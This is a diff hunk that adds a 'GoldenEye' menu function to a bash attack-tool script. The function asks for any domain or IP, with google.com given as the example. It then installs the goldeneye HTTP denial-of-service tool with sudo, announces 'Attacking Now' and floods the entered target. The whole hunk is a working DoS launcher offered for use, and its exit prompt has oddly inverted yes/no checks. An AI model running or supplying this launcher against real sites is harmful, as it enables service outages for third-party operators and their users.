@@ -217,6 +217,43 @@ fi
 #################
 
 
+##################
+#START GoldenEye##
+GoldenEYE()
+{
+		echo "" && echo -e "$cyan"
+				echo -n -e "  Please Enter A domain Exp, https://google.com or IP - "
+		read DOMAin
+	if [ -z "$DOMAin" ]; then
+		
+ 				echo -n -e $red"  Do you want exit?$cyan ( Yes / No ) : " ;tput sgr0
+					read back
+						if [ -z "$back" ]; then
+							exit
+							fi
+						if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
+												then
+													echo "" && echo -e $BlueF" [$white"*"$BlueF]$red  Exiting ..." && sleep 0.2
+                                                 	echo -e $BlueF" [$white"*"$BlueF]$red  GoodBye!"
+	                                                exit 0
+										elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
+												then
+												clear
+                                                attacker
+		
+	fi
+fi
+		echo "" && echo -e "$cyan"
+		sudo apt-get install goldeneye
+		clear && echo "" && echo -e "$cyan"
+		echo -e "     ...:$BlueF Attacking Now $cyan:..."
+		goldeneye $DOMAin
+}
+##END GoldenEye##
+#################
+
+
+
 
 #######################
 #######################
